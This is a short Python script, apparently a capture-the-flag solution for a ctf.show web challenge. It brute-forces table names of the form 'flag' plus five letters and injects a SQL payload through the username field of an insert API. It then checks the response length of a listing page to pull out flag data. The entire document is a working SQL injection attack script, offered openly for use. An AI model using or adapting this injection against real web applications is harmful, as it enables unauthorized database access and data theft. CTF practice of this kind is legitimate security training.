
import requests
url = "http://413ddb63-22e8-44ca-94d5-2d9e964e5a32.challenge.ctf.show/api/insert.php"
url1= 'http://413ddb63-22e8-44ca-94d5-2d9e964e5a32.challenge.ctf.show/api/?desc&page=1&limit=10'
str = 'ab'
for i in str:
    for j in str:
        for k in str:
            for l in str:
                for n in str:
                    print('flag'+f'{i+j+k+l+n}')
                    payload = {
                        'username': f"48',(select(group_concat(flag))from(flag{i+j+k+l+n})))#",
                        'password': "7"
                    }
                    requests.post(url=url, data=payload)
                    r = requests.get(url=url1).text
                    if len(r) != 543:
                        break
